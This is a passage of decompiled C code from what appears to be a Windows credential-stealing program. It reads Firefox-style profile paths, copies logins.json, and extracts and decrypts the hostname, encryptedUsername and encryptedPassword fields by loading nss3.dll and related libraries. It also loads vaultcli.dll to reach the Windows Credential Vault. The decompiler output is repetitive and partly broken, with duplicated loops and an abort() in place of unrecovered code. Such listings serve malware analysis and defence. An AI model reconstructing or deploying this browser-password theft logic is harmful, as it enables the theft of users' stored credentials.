                        // 0x40d88c
                        v77 = v107;
                        if (v49 != v108) {
                            // 0x40d890
                            *(int32_t *)(v62 - 52) = v108;
                            function_40434f((char *)&g322);
                            *(int32_t *)(v62 - 56) = (int32_t)&v72;
                            v76 = function_4040d5(&g322);
                            v77 = v62 - 60;
                            *(int32_t *)v77 = v76;
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v72 = 0;
                            function_406f1d();
                        }
                        // 0x40d8c8
                        v52 = v77;
                        v75 = (int32_t)v70;
                        v51 = v75;
                        v50 = v51 + 1;
                        while (*(char *)v51 != 0) {
                            // 0x40d8ce
                            v51 = v50;
                            v50 = v51 + 1;
                        }
                        // 0x40d8d5
                        v81 = v52;
                        if (v51 != v75) {
                            // 0x40d8d9
                            *(int32_t *)(v52 - 4) = v75;
                            function_40434f((char *)&g322);
                            *(int32_t *)(v52 - 8) = (int32_t)&v73;
                            v80 = function_4040d5(&g322);
                            v81 = v52 - 12;
                            *(int32_t *)v81 = v80;
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v73 = 0;
                            function_406f1d();
                        }
                        // 0x40d911
                        v78 = v81 - 20;
                        *(int32_t *)v78 = v23;
                        function_402790(0);
                        function_40283b();
                        function_406f1d();
                        function_406f1d();
                        v79 = v68 - 1;
                        function_406f1d();
                        function_406f1d();
                        function_406f1d();
                        function_4015d4();
                        v68 = v79;
                        v53 = v78;
                        while (v79 != 0) {
                            // 0x40d771
                            v62 = v78;
                            *(int32_t *)(v62 - 4) = (int32_t)"hostname";
                            v22 = NULL;
                            v98 = function_40434f(NULL);
                            *(int32_t *)(v62 - 8) = (int32_t)&v64;
                            function_403f58((int32_t)&g322);
                            v99 = (int32_t *)(v62 - 12);
                            *v99 = v68;
                            v100 = (int32_t *)(v62 - 16);
                            *v100 = v98;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v99 = (int32_t)"encryptedUsername";
                            v101 = function_40434f((char *)&g322);
                            *v100 = (int32_t)&v65;
                            function_403f58((int32_t)&g322);
                            v102 = (int32_t *)(v62 - 20);
                            *v102 = v68;
                            v103 = (int32_t *)(v62 - 24);
                            *v103 = v101;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v102 = (int32_t)"encryptedPassword";
                            v104 = function_40434f((char *)&g322);
                            *v103 = (int32_t)&v66;
                            function_403f58((int32_t)&g322);
                            v105 = (int32_t *)(v62 - 28);
                            *v105 = v68;
                            *(int32_t *)(v62 - 32) = v104;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v105 = (int32_t)&v69;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v62 - 36) = (int32_t)&v70;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v62 - 44) = (int32_t)&v71;
                            v106 = function_4040d5(&g322);
                            v107 = v62 - 48;
                            *(int32_t *)v107 = v106;
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v108 = (int32_t)v69;
                            v71 = 0;
                            v49 = v108;
                            v48 = v49 + 1;
                            while (*(char *)v49 != 0) {
                                // 0x40d885
                                v49 = v48;
                                v48 = v49 + 1;
                            }
                            // 0x40d88c
                            v77 = v107;
                            if (v49 != v108) {
                                // 0x40d890
                                *(int32_t *)(v62 - 52) = v108;
                                function_40434f((char *)&g322);
                                *(int32_t *)(v62 - 56) = (int32_t)&v72;
                                v76 = function_4040d5(&g322);
                                v77 = v62 - 60;
                                *(int32_t *)v77 = v76;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v72 = 0;
                                function_406f1d();
                            }
                            // 0x40d8c8
                            v52 = v77;
                            v75 = (int32_t)v70;
                            v51 = v75;
                            v50 = v51 + 1;
                            while (*(char *)v51 != 0) {
                                // 0x40d8ce
                                v51 = v50;
                                v50 = v51 + 1;
                            }
                            // 0x40d8d5
                            v81 = v52;
                            if (v51 != v75) {
                                // 0x40d8d9
                                *(int32_t *)(v52 - 4) = v75;
                                function_40434f((char *)&g322);
                                *(int32_t *)(v52 - 8) = (int32_t)&v73;
                                v80 = function_4040d5(&g322);
                                v81 = v52 - 12;
                                *(int32_t *)v81 = v80;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v73 = 0;
                                function_406f1d();
                            }
                            // 0x40d911
                            v78 = v81 - 20;
                            *(int32_t *)v78 = v23;
                            function_402790(0);
                            function_40283b();
                            function_406f1d();
                            function_406f1d();
                            v79 = v68 - 1;
                            function_406f1d();
                            function_406f1d();
                            function_406f1d();
                            function_4015d4();
                            v68 = v79;
                            v53 = v78;
                        }
                    }
                    // 0x40d96e
                    v54 = v53;
                    v96 = v54 - 4;
                    *(int32_t *)v96 = v18;
                    v97 = PathFileExistsW((int16_t *)&g322);
                    v55 = v96;
                    if (v97) {
                        // 0x40d97d
                        lpString4 = v54 - 8;
                        v110 = (int32_t *)lpString4;
                        *v110 = 0;
                        v111 = v18;
                        v74 = lpString4;
                        if (v111 != 0) {
                            // 0x40d98a
                            *(int32_t *)(v54 - 12) = v111;
                            lstrlenW((int16_t *)lpString4);
                            v112 = function_406f2c();
                            *(int32_t *)(v54 - 16) = v18;
                            v74 = v54 - 20;
                            *(int32_t *)v74 = v112;
                            *v110 = v112;
                            lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
                        }
                        // 0x40d9ae
                        function_413c34((int32_t)&g322);
                        v55 = v74 + 4;
                    }
                    // 0x40d9b4
                    v56 = v55;
                    v109 = (int32_t *)(v56 - 4);
                    if (v20 != 0) {
                        // 0x40d9d4
                        function_406f66();
                    }
                    // 0x40d9d9
                    v20 = 0;
                }
                // 0x40d9e2
                function_413c16();
                function_406f1d();
                v18 = 0;
                function_406f1d();
                v41 = v109;
                v42 = v56;
            }
        }
        // 0x40d9fa
        function_406f1d();
        function_406f1d();
        *v41 = v13;
        *(int32_t *)(v42 - 8) = 260;
        *(int32_t *)(v42 - 12) = v16;
        *(int32_t *)(v42 - 16) = 0;
        *(int32_t *)(v42 - 20) = (int32_t)L"Path";
        int32_t v113 = v42 - 24; // 0x40da1d
        while (GetPrivateProfileStringW((int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322, (int16_t *)&g322) != 0) {
            // 0x40d504
            v25 = v113;
            v24++;
            *(int32_t *)(v25 - 4) = (int32_t)L"Profile";
            *(int32_t *)(v25 - 8) = function_40460a((int16_t *)v24);
            function_4043c7((int32_t)&g322);
            function_406f1d();
            v26 = v25 - 12;
            *(int32_t *)v26 = v24;
            function_404477(0);
            lpString1___ = NULL;
            v27 = v26;
            if (a1 != 0) {
                // 0x40d53e
                *(int32_t *)(v25 - 16) = a1;
                lstrlenW(NULL);
                v28 = function_406f2c();
                *(int32_t *)(v25 - 20) = a1;
                lpString1___ = (int16_t *)v28;
                v27 = v25 - 24;
                *(int32_t *)v27 = v28;
                lstrcpyW(lpString1___, (int16_t *)&g322);
            }
            // 0x40d560
            v29 = v27;
            v30 = lpString1___;
            v31 = v29 - 4;
            *(int32_t *)v31 = v16;
            function_4043fa((int16_t *)&g322);
            v32 = (int32_t)v30;
            v33 = v31;
            if (v30 != NULL) {
                // 0x40d57b
                *(int32_t *)(v29 - 8) = v32;
                v34 = lstrlenW(NULL);
                *(int32_t *)(v29 - 12) = 0;
                *(int32_t *)(v29 - 16) = 0;
                *(int32_t *)(v29 - 20) = 0;
                *(int32_t *)(v29 - 24) = 0;
                *(int32_t *)(v29 - 28) = v34;
                *(int32_t *)(v29 - 32) = v32;
                *(int32_t *)(v29 - 36) = 512;
                *(int32_t *)(v29 - 40) = 0;
                v35 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
                v36 = function_406f2c();
                *(int32_t *)(v29 - 44) = v32;
                v37 = lstrlenW((int16_t *)&g322);
                *(int32_t *)(v29 - 48) = 0;
                *(int32_t *)(v29 - 52) = 0;
                *(int32_t *)(v29 - 56) = v35;
                *(int32_t *)(v29 - 60) = v36;
                *(int32_t *)(v29 - 64) = v37;
                *(int32_t *)(v29 - 68) = v32;
                *(int32_t *)(v29 - 72) = 0;
                *(int32_t *)(v29 - 76) = 0xfde9;
                WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
                *(int32_t *)(v29 - 80) = v36;
                v38 = function_40434f((char *)&g322);
                v33 = v29 - 84;
                *(int32_t *)v33 = v38;
                function_40415d((int32_t)&g322);
                function_406f1d();
                function_406f1d();
            }
            // 0x40d5e0
            v39 = v33;
            v40 = (int32_t *)(v39 - 4);
            *v40 = 0;
            v41 = v40;
            v42 = v39;
            if (!((lpString3 == 0 | *(int32_t *)(lpString3 + 132) != 0))) {
                // 0x40d60e
                *v40 = 0;
                v82 = (int32_t *)(v39 - 8);
                *v82 = 1;
                v83 = v39 - 12;
                v84 = (int32_t *)v83;
                v41 = v40;
                v42 = v39;
                if (*(int32_t *)(lpString3 + 152) == 0) {
                    // 0x40d628
                    v46 = v84;
                    v45 = v82;
                    v44 = v40;
                    lpString1____ = NULL;
                    v57 = v39;
                    if (v30 != NULL) {
                        // 0x40d62f
                        *v40 = v32;
                        lstrlenW((int16_t *)lpString3);
                        v88 = function_406f2c();
                        *v82 = v32;
                        *v84 = v88;
                        lpString1____ = (int16_t *)v88;
                        lstrcpyW(lpString1____, (int16_t *)&g322);
                        v46 = (int32_t *)(v39 - 24);
                        v45 = (int32_t *)(v39 - 20);
                        v44 = (int32_t *)(v39 - 16);
                        v57 = v83;
                    }
                    // 0x40d64d
                    v58 = v57;
                    *v44 = (int32_t)L"\\logins.json";
                    function_4043fa((int16_t *)&g322);
                    *v45 = 26;
                    function_413915();
                    *v45 = (int32_t)&g17;
                    function_4043fa((int16_t *)&g322);
                    *v46 = 8;
                    *v46 = function_4044c4();
                    function_4042c5((int32_t)&g322);
                    function_406f1d();
                    *(int32_t *)(v58 - 16) = (int32_t)L".tmp";
                    function_4043fa(NULL);
                    *(int32_t *)(v58 - 20) = 0;
                    *(int32_t *)(v58 - 24) = v18;
                    v85 = (int32_t)lpString1____;
                    v86 = v58 - 28;
                    *(int32_t *)v86 = v85;
                    v87 = CopyFileW((int16_t *)&g322, (int16_t *)&g322, (bool)&g322);
                    v89 = v86;
                    if (v87) {
                        // 0x40d6af
                        v89 = v58 - 32;
                        *(int32_t *)v89 = v19;
                        function_4043c7((int32_t)&g322);
                    }
                    // 0x40d6bb
                    v59 = v89;
                    function_413fc0();
                    v47 = &v67;
                    v93 = v59;
                    if (lpString1____ != NULL) {
                        // 0x40d6d3
                        *(int32_t *)(v59 - 4) = v85;
                        v92 = lstrlenW(NULL);
                        lpString1_____ = function_406e8d();
                        *(int32_t *)(v59 - 8) = v85;
                        v93 = v59 - 12;
                        *(int32_t *)v93 = lpString1_____;
                        lstrcpyW((int16_t *)lpString1_____, (int16_t *)&g322);
                        v47 = 2 * v92 + 2;
                    }
                    // 0x40d6f6
                    v60 = v93;
                    *(int32_t *)(v60 - 4) = v47;
                    v90 = v60 - 8;
                    *(int32_t *)v90 = -0x40000000;
                    v91 = function_413f4f((int32_t)&g322);
                    v43 = (int32_t *)(v60 - 12);
                    v109 = v43;
                    v56 = v90;
                    if (v91 != 0) {
                        // 0x40d715
                        *v43 = 0;
                        v20 = 0;
                        *(int32_t *)(v60 - 20) = v21;
                        function_413b7c(v20, 0, (int32_t)&g322);
                        *(int32_t *)(v60 - 24) = (int32_t)"encryptedUsername";
                        function_40434f((char *)&g322);
                        v94 = v60 - 28;
                        *(int32_t *)v94 = (int32_t)&v63;
                        function_403f58((int32_t)&g322);
                        v95 = function_40c354();
                        function_406f1d();
                        function_406f1d();
                        v68 = v95;
                        v61 = v94;
                        v53 = v94;
                        if (v95 != 0) {
                            v62 = v61;
                            *(int32_t *)(v62 - 4) = (int32_t)"hostname";
                            v22 = NULL;
                            v98 = function_40434f(NULL);
                            *(int32_t *)(v62 - 8) = (int32_t)&v64;
                            function_403f58((int32_t)&g322);
                            v99 = (int32_t *)(v62 - 12);
                            *v99 = v68;
                            v100 = (int32_t *)(v62 - 16);
                            *v100 = v98;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v99 = (int32_t)"encryptedUsername";
                            v101 = function_40434f((char *)&g322);
                            *v100 = (int32_t)&v65;
                            function_403f58((int32_t)&g322);
                            v102 = (int32_t *)(v62 - 20);
                            *v102 = v68;
                            v103 = (int32_t *)(v62 - 24);
                            *v103 = v101;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v102 = (int32_t)"encryptedPassword";
                            v104 = function_40434f((char *)&g322);
                            *v103 = (int32_t)&v66;
                            function_403f58((int32_t)&g322);
                            v105 = (int32_t *)(v62 - 28);
                            *v105 = v68;
                            *(int32_t *)(v62 - 32) = v104;
                            function_40c38d((int32_t)&g322, (int32_t)&g322);
                            function_406f1d();
                            function_406f1d();
                            *v105 = (int32_t)&v69;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v62 - 36) = (int32_t)&v70;
                            function_40da6a((int32_t)&g322, (int32_t)&g322);
                            *(int32_t *)(v62 - 44) = (int32_t)&v71;
                            v106 = function_4040d5(&g322);
                            v107 = v62 - 48;
                            *(int32_t *)v107 = v106;
                            function_4043c7((int32_t)&g322);
                            function_406f1d();
                            v108 = (int32_t)v69;
                            v71 = 0;
                            v49 = v108;
                            v48 = v49 + 1;
                            while (*(char *)v49 != 0) {
                                // 0x40d885
                                v49 = v48;
                                v48 = v49 + 1;
                            }
                            // 0x40d88c
                            v77 = v107;
                            if (v49 != v108) {
                                // 0x40d890
                                *(int32_t *)(v62 - 52) = v108;
                                function_40434f((char *)&g322);
                                *(int32_t *)(v62 - 56) = (int32_t)&v72;
                                v76 = function_4040d5(&g322);
                                v77 = v62 - 60;
                                *(int32_t *)v77 = v76;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v72 = 0;
                                function_406f1d();
                            }
                            // 0x40d8c8
                            v52 = v77;
                            v75 = (int32_t)v70;
                            v51 = v75;
                            v50 = v51 + 1;
                            while (*(char *)v51 != 0) {
                                // 0x40d8ce
                                v51 = v50;
                                v50 = v51 + 1;
                            }
                            // 0x40d8d5
                            v81 = v52;
                            if (v51 != v75) {
                                // 0x40d8d9
                                *(int32_t *)(v52 - 4) = v75;
                                function_40434f((char *)&g322);
                                *(int32_t *)(v52 - 8) = (int32_t)&v73;
                                v80 = function_4040d5(&g322);
                                v81 = v52 - 12;
                                *(int32_t *)v81 = v80;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v73 = 0;
                                function_406f1d();
                            }
                            // 0x40d911
                            v78 = v81 - 20;
                            *(int32_t *)v78 = v23;
                            function_402790(0);
                            function_40283b();
                            function_406f1d();
                            function_406f1d();
                            v79 = v68 - 1;
                            function_406f1d();
                            function_406f1d();
                            function_406f1d();
                            function_4015d4();
                            v68 = v79;
                            v53 = v78;
                            while (v79 != 0) {
                                // 0x40d771
                                v62 = v78;
                                *(int32_t *)(v62 - 4) = (int32_t)"hostname";
                                v22 = NULL;
                                v98 = function_40434f(NULL);
                                *(int32_t *)(v62 - 8) = (int32_t)&v64;
                                function_403f58((int32_t)&g322);
                                v99 = (int32_t *)(v62 - 12);
                                *v99 = v68;
                                v100 = (int32_t *)(v62 - 16);
                                *v100 = v98;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v99 = (int32_t)"encryptedUsername";
                                v101 = function_40434f((char *)&g322);
                                *v100 = (int32_t)&v65;
                                function_403f58((int32_t)&g322);
                                v102 = (int32_t *)(v62 - 20);
                                *v102 = v68;
                                v103 = (int32_t *)(v62 - 24);
                                *v103 = v101;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v102 = (int32_t)"encryptedPassword";
                                v104 = function_40434f((char *)&g322);
                                *v103 = (int32_t)&v66;
                                function_403f58((int32_t)&g322);
                                v105 = (int32_t *)(v62 - 28);
                                *v105 = v68;
                                *(int32_t *)(v62 - 32) = v104;
                                function_40c38d((int32_t)&g322, (int32_t)&g322);
                                function_406f1d();
                                function_406f1d();
                                *v105 = (int32_t)&v69;
                                function_40da6a((int32_t)&g322, (int32_t)&g322);
                                *(int32_t *)(v62 - 36) = (int32_t)&v70;
                                function_40da6a((int32_t)&g322, (int32_t)&g322);
                                *(int32_t *)(v62 - 44) = (int32_t)&v71;
                                v106 = function_4040d5(&g322);
                                v107 = v62 - 48;
                                *(int32_t *)v107 = v106;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v108 = (int32_t)v69;
                                v71 = 0;
                                v49 = v108;
                                v48 = v49 + 1;
                                while (*(char *)v49 != 0) {
                                    // 0x40d885
                                    v49 = v48;
                                    v48 = v49 + 1;
                                }
                                // 0x40d88c
                                v77 = v107;
                                if (v49 != v108) {
                                    // 0x40d890
                                    *(int32_t *)(v62 - 52) = v108;
                                    function_40434f((char *)&g322);
                                    *(int32_t *)(v62 - 56) = (int32_t)&v72;
                                    v76 = function_4040d5(&g322);
                                    v77 = v62 - 60;
                                    *(int32_t *)v77 = v76;
                                    function_4043c7((int32_t)&g322);
                                    function_406f1d();
                                    v72 = 0;
                                    function_406f1d();
                                }
                                // 0x40d8c8
                                v52 = v77;
                                v75 = (int32_t)v70;
                                v51 = v75;
                                v50 = v51 + 1;
                                while (*(char *)v51 != 0) {
                                    // 0x40d8ce
                                    v51 = v50;
                                    v50 = v51 + 1;
                                }
                                // 0x40d8d5
                                v81 = v52;
                                if (v51 != v75) {
                                    // 0x40d8d9
                                    *(int32_t *)(v52 - 4) = v75;
                                    function_40434f((char *)&g322);
                                    *(int32_t *)(v52 - 8) = (int32_t)&v73;
                                    v80 = function_4040d5(&g322);
                                    v81 = v52 - 12;
                                    *(int32_t *)v81 = v80;
                                    function_4043c7((int32_t)&g322);
                                    function_406f1d();
                                    v73 = 0;
                                    function_406f1d();
                                }
                                // 0x40d911
                                v78 = v81 - 20;
                                *(int32_t *)v78 = v23;
                                function_402790(0);
                                function_40283b();
                                function_406f1d();
                                function_406f1d();
                                v79 = v68 - 1;
                                function_406f1d();
                                function_406f1d();
                                function_406f1d();
                                function_4015d4();
                                v68 = v79;
                                v53 = v78;
                            }
                        }
                        // 0x40d96e
                        v54 = v53;
                        v96 = v54 - 4;
                        *(int32_t *)v96 = v18;
                        v97 = PathFileExistsW((int16_t *)&g322);
                        v55 = v96;
                        if (v97) {
                            // 0x40d97d
                            lpString4 = v54 - 8;
                            v110 = (int32_t *)lpString4;
                            *v110 = 0;
                            v111 = v18;
                            v74 = lpString4;
                            if (v111 != 0) {
                                // 0x40d98a
                                *(int32_t *)(v54 - 12) = v111;
                                lstrlenW((int16_t *)lpString4);
                                v112 = function_406f2c();
                                *(int32_t *)(v54 - 16) = v18;
                                v74 = v54 - 20;
                                *(int32_t *)v74 = v112;
                                *v110 = v112;
                                lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
                            }
                            // 0x40d9ae
                            function_413c34((int32_t)&g322);
                            v55 = v74 + 4;
                        }
                        // 0x40d9b4
                        v56 = v55;
                        v109 = (int32_t *)(v56 - 4);
                        if (v20 != 0) {
                            // 0x40d9d4
                            function_406f66();
                        }
                        // 0x40d9d9
                        v20 = 0;
                    }
                    // 0x40d9e2
                    function_413c16();
                    function_406f1d();
                    v18 = 0;
                    function_406f1d();
                    v41 = v109;
                    v42 = v56;
                }
            }
            // 0x40d9fa
            function_406f1d();
            function_406f1d();
            *v41 = v13;
            *(int32_t *)(v42 - 8) = 260;
            *(int32_t *)(v42 - 12) = v16;
            *(int32_t *)(v42 - 16) = 0;
            *(int32_t *)(v42 - 20) = (int32_t)L"Path";
            v113 = v42 - 24;
        }
    }
    // 0x40da37
    function_40e2da();
    function_406f1d();
    result = 1;
    goto lab_0x40da49;
}

// Address range: 0x40da6a - 0x40db12
int32_t function_40da6a(int32_t a1, int32_t a2) {
    // 0x40da6a
    int32_t v1; // 0x40da6a
    function_401230(v1);
    int32_t pcbBinary = 0x1fa0; // bp-8, 0x40da84
    char * lpString = (char *)a1; // 0x40da87
    int32_t cchString = lstrlenA(lpString); // 0x40da87
    int32_t pbBinary; // bp-8128, 0x40da6a
    function_401293(&pbBinary, 0, 0x1fa0);
    CryptStringToBinaryA(lpString, cchString, 1, (char *)&pbBinary, &pcbBinary, NULL, NULL);
    abort();
    // UNREACHABLE
}

// Address range: 0x40db12 - 0x40de44
int32_t function_40db12(void) {
    int32_t v1 = function_40de78(); // 0x40db33
    int32_t v2; // bp-116, 0x40db12
    int32_t * v3 = &v2; // 0x40db3a
    int32_t v4; // 0x40db12
    if (v1 != 0) {
        int32_t v5 = &g147; // bp-128, 0x40db4b
        v3 = &v5;
        if (*(int32_t *)(v4 + 168) == 0) {
            int32_t v6 = 0; // bp-144, 0x40db6d
            v3 = &v6;
        }
    }
    // 0x40de1e
    *(int32_t *)((int32_t)v3 - 4) = *(int32_t *)(v4 + 220);
    FreeLibrary(&g322);
    function_406f1d();
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x40de44 - 0x40de6b
int32_t function_40de44(void) {
    int32_t v1 = function_4136c8(); // 0x40de44
    if (v1 < 1001) {
        // 0x40de67
        return 1;
    }
    // 0x40de57
    return v1 < 0x2711;
}

// Address range: 0x40de6b - 0x40de78
bool function_40de6b(int32_t * hLibModule) {
    // 0x40de6b
    int32_t v1; // 0x40de6b
    return FreeLibrary((int32_t *)*(int32_t *)(v1 + 220));
}

// Address range: 0x40de78 - 0x40df46
int32_t function_40de78(void) {
    int32_t * moduleHandle = LoadLibraryA("vaultcli.dll"); // 0x40de80
    int32_t v1; // 0x40de78
    *(int32_t *)(v1 + 220) = (int32_t)moduleHandle;
    if (moduleHandle == NULL) {
        // 0x40df42
        return 0;
    }
    int32_t v2 = function_41473a(); // 0x40de9d
    int32_t * v3 = (int32_t *)(v1 + 168); // 0x40dead
    *v3 = v2;
    int32_t v4 = function_41473a(); // 0x40deb3
    int32_t * v5 = (int32_t *)(v1 + 172); // 0x40dec3
    *v5 = v4;
    int32_t v6 = function_41473a(); // 0x40dec9
    int32_t * v7 = (int32_t *)(v1 + 176); // 0x40dedb
    *v7 = v6;
    int32_t v8 = function_41473a(); // 0x40dee1
    int32_t * v9 = (int32_t *)(v1 + 180); // 0x40deee
    *v9 = v8;
    *(int32_t *)(v1 + 184) = function_41473a();
    int32_t v10 = function_41473a(); // 0x40df0a
    *(int32_t *)(v1 + 188) = v10;
    if (*v3 == 0 || *v7 == 0 || *v5 == 0 || *v9 == 0) {
        // 0x40df42
        return 0;
    }
    // 0x40df3b
    return v10 != 0;
}

// Address range: 0x40df46 - 0x40df9d
int32_t function_40df46(void) {
    // 0x40df46
    int32_t v1; // 0x40df46
    int32_t * hLibModule = (int32_t *)(v1 + 208); // 0x40df51
    FreeLibrary((int32_t *)*hLibModule);
    int32_t * hLibModule2 = (int32_t *)(v1 + 196); // 0x40df59
    *hLibModule = 0;
    FreeLibrary((int32_t *)*hLibModule2);
    int32_t * hLibModule3 = (int32_t *)(v1 + 200); // 0x40df69
    *hLibModule2 = 0;
    FreeLibrary((int32_t *)*hLibModule3);
    int32_t * hLibModule4 = (int32_t *)(v1 + 212); // 0x40df77
    *hLibModule3 = 0;
    FreeLibrary((int32_t *)*hLibModule4);
    int32_t * hLibModule5 = (int32_t *)(v1 + 204); // 0x40df85
    *hLibModule4 = 0;
    bool result = FreeLibrary((int32_t *)*hLibModule5); // 0x40df91
    *hLibModule5 = 0;
    return result;
}

// Address range: 0x40df9d - 0x40e2da
int32_t function_40df9d(int32_t lpPathName) {
    int32_t v1 = lpPathName;
    int32_t lpBuffer; // bp-560, 0x40df9d
    function_401293(&lpBuffer, 0, 260);
    GetCurrentDirectoryW(260, (int16_t *)&lpBuffer);
    SetCurrentDirectoryW((int16_t *)lpPathName);
    function_4043fa((int16_t *)&g17);
    int32_t v2 = &v1; // 0x40dfea
    function_404656(v2);
    function_4043fa(L"nss3.dll");
    function_404656(v2);
    function_4043fa(L"msvcr120.dll");
    function_404656(v2);
    function_4043fa(L"msvcp120.dll");
    function_404656(v2);
    function_4043fa(L"mozglue.dll");
    function_404656(v2);
    function_4043fa(L"softokn3.dll");
    function_404656(v2);
    function_4043fa(L"msvcp");
    function_404656(v2);
    int16_t * v3 = L"msvcr"; // bp-644, 0x40e089
    function_4043fa(L"msvcr");
    int32_t v4 = (int32_t)&v3;
    int32_t v5 = 90;
    int32_t v6; // bp-28, 0x40df9d
    *(int32_t *)(v4 - 4) = (int32_t)&v6;
    function_404656((int32_t)&g322);
    *(int32_t *)(v4 - 8) = v5;
    function_404477((int32_t)&g322);
    *(int32_t *)(v4 - 12) = (int32_t)L".dll";
    function_4043fa((int16_t *)&g322);
    int32_t v7 = v4 - 16; // 0x40e0bf
    int32_t v8; // bp-8, 0x40df9d
    *(int32_t *)v7 = v8;
    int32_t v9; // 0x40df9d
    while (!PathFileExistsW((int16_t *)&g322)) {
        // 0x40e0cc
        function_406f1d();
        v8 = 0;
        v9 = v7;
        if (v5 == 140) {
            goto lab_0x40e0fa;
        }
        v4 = v7;
        v5 += 10;
        *(int32_t *)(v4 - 4) = (int32_t)&v6;
        function_404656((int32_t)&g322);
        *(int32_t *)(v4 - 8) = v5;
        function_404477((int32_t)&g322);
        *(int32_t *)(v4 - 12) = (int32_t)L".dll";
        function_4043fa((int16_t *)&g322);
        v7 = v4 - 16;
        *(int32_t *)v7 = v8;
    }
    int32_t v10 = v4 - 20; // 0x40e0e9
    *(int32_t *)v10 = (int32_t)&v8;
    function_4043c7((int32_t)&g322);
    function_406f1d();
    v9 = v10;
  lab_0x40e0fa:;
    int32_t v11 = 90;
    int32_t v12 = v9;
    int32_t v13; // bp-24, 0x40df9d
    *(int32_t *)(v12 - 4) = (int32_t)&v13;
    function_404656((int32_t)&g322);
    *(int32_t *)(v12 - 8) = v11;
    function_404477((int32_t)&g322);
    *(int32_t *)(v12 - 12) = (int32_t)L".dll";
    function_4043fa((int16_t *)&g322);
    int32_t v14 = v12 - 16; // 0x40e11b
    *(int32_t *)v14 = v8;
    int32_t v15; // 0x40df9d
    while (!PathFileExistsW((int16_t *)&g322)) {
        // 0x40e128
        function_406f1d();
        v8 = 0;
        v15 = v14;
        if (v11 == 140) {
            goto lab_0x40e154;
        }
        v11 += 10;
        v12 = v14;
        *(int32_t *)(v12 - 4) = (int32_t)&v13;
        function_404656((int32_t)&g322);
        *(int32_t *)(v12 - 8) = v11;
        function_404477((int32_t)&g322);
        *(int32_t *)(v12 - 12) = (int32_t)L".dll";
        function_4043fa((int16_t *)&g322);
        v14 = v12 - 16;
        *(int32_t *)v14 = v8;
    }
    int32_t v16 = v12 - 20; // 0x40e143
    *(int32_t *)v16 = (int32_t)&v8;
    function_4043c7((int32_t)&g322);
    function_406f1d();
    v15 = v16;
  lab_0x40e154:;
    // 0x40e154
    int32_t v17; // 0x40df9d
    *(int32_t *)(v17 + 196) = (int32_t)LoadLibraryW((int16_t *)&g322);
    int32_t * v18 = LoadLibraryW((int16_t *)&g322); // 0x40e168
    int32_t * v19 = (int32_t *)(v17 + 200); // 0x40e16d
    *v19 = (int32_t)v18;
    int32_t * v20 = LoadLibraryW((int16_t *)&g322); // 0x40e173
    int32_t * v21 = (int32_t *)(v17 + 204); // 0x40e178
    *v21 = (int32_t)v20;
    int32_t * v22 = LoadLibraryW((int16_t *)&g322); // 0x40e17e
    int32_t * v23 = (int32_t *)(v17 + 208); // 0x40e183
    *v23 = (int32_t)v22;
    int32_t * v24 = LoadLibraryW((int16_t *)&g322); // 0x40e189
    *(int32_t *)(v17 + 212) = (int32_t)v24;
    int32_t result = 0; // 0x40e197
    if (*v19 != 0) {
        // 0x40e19d
        result = 0;
        if (*v21 != 0) {
            int32_t v25 = *v23; // 0x40e1a9
            result = 0;
            if (v24 != NULL && v25 != 0) {
                int32_t * v26 = (int32_t *)(v15 - 24); // 0x40e1bf
                *v26 = v25;
                *(int32_t *)(v17 + 132) = function_41473a();
                *(int32_t *)(v17 + 156) = function_41473a();
                *(int32_t *)(v17 + 152) = function_41473a();
                *(int32_t *)(v17 + 140) = function_41473a();
                *(int32_t *)(v17 + 144) = function_41473a();
                *(int32_t *)(v17 + 148) = function_41473a();
                *(int32_t *)(v17 + 136) = function_41473a();
                *(int32_t *)(v17 + 160) = function_41473a();
                *(int32_t *)(v17 + 164) = function_41473a();
                *v26 = (int32_t)&lpBuffer;
                SetCurrentDirectoryW((int16_t *)&g322);
                result = 1;
            }
        }
    }
    // 0x40e291
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return result;
}

// Address range: 0x40e2da - 0x40e331
int32_t function_40e2da(void) {
    // 0x40e2da
    int32_t v1; // 0x40e2da
    int32_t * hLibModule = (int32_t *)(v1 + 208); // 0x40e2e5
    FreeLibrary((int32_t *)*hLibModule);
    int32_t * hLibModule2 = (int32_t *)(v1 + 196); // 0x40e2ed
    *hLibModule = 0;
    FreeLibrary((int32_t *)*hLibModule2);
    int32_t * hLibModule3 = (int32_t *)(v1 + 200); // 0x40e2fd
    *hLibModule2 = 0;
    FreeLibrary((int32_t *)*hLibModule3);
